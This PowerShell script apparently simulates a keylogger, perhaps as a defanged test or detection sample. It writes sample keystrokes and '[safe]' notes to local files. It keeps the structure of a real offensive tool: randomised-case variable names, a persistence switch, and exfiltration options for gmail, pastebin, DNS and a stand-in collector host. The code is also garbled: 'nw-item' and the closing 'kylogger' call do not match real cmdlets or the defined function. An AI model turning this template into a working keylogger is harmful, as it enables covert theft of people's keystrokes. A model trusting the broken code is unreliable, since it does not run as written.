Function Keylogger {
    [CmdletBinding()]
    Param(
        [String]${magicSTrinG} = "stopthis" , 
        [String]${CHEckuRL} = "https://example.invalid/control.txt" , 
        [switch]${exFIL} , 
        [ValidateSet("gmail" , "pastebin" , "WebServer" , "DNS")]
        [String]${exFILoPtIoN} = "WebServer" , 
        [String]${uRL} = "https://collector.example.invalid/ingest" , 
        [switch]${peRSIst} , 
        [String]${SamplEINPut} = "demo.user<Tab>hello123<Enter>"
    )

    ${aRTIFACTdIR} = Join-Path ${psSCRIPtRooT} "artifacts\keylogger"
    If ( -Not (Test-Path ${aRTifActDir} )) {
        ${Null} = nw-item -ItemType Directory -Path ${aRTIFacTdIr} -Force
    }

    ${lOGPaTh} = Join-Path ${aRTIfAcTDIR} "key.log"
    ${cAPTUrE} = ${SamPLEiNpUt} `
         -Replace "<Tab>" , "[TAB]" `
         -Replace "<Enter>" , "[ENTER]"

    Set-Content -Path ${LOgpAth} -Value ${cAPTUre} -Encoding UTF8
    Write-Output "[safe] Simulated keystrokes written to $logPath"

    If (${persISt} ) {
        ${PeRSISTNote} = Join-Path ${ARTiFACtdir} "persistence-note.txt"
        Set-Content -Path ${PErSiStnOTe} -Value "[safe] Persistence requested but not installed." -Encoding UTF8
        Write-Output "[safe] Persistence step was simulated only."
    }

    If (${EXFIl} ) {
        ${ExFILpaTh} = Join-Path ${aRtIFactdiR} ("exfil-" + ${exfIlOPTIOn}.ToLower() + ".txt")

        Switch (${EXfiLOPTiOn} ) {
            "gmail" {
                ${ConTENt} = @(
                    "[safe] Would send email exfiltration."
                    "SMTP: smtp.gmail.com"
                    "Message: $capture"
                )
            }
            "pastebin" {
                ${CONTEnT} = @(
                    "[safe] Would create a paste."
                    "Endpoint: https://pastebin.com/api/api_post.php"
                    "Body: $capture"
                )
            }
            "DNS" {
                ${CONtENt} = @(
                    "[safe] Would exfiltrate via DNS."
                    "Query: $capture"
                )
            }
            default {
                ${cONTEnT} = @(
                    "[safe] Would POST captured keys to web server."
                    "URL: $URL"
                    "Body: $capture"
                )
            }
        }

        Set-Content -Path ${eXFilPAth} -Value ${CONTenT} -Encoding UTF8
        Write-Output "[safe] Exfiltration simulated via $ExfilOption."
    }

    Write-Output "[safe] Magic stop string remains configured as '$MagicString' from $CheckURL"
}

kylogger -exfil -exfiloption WebServer -url "https://collector.example.invalid/ingest"
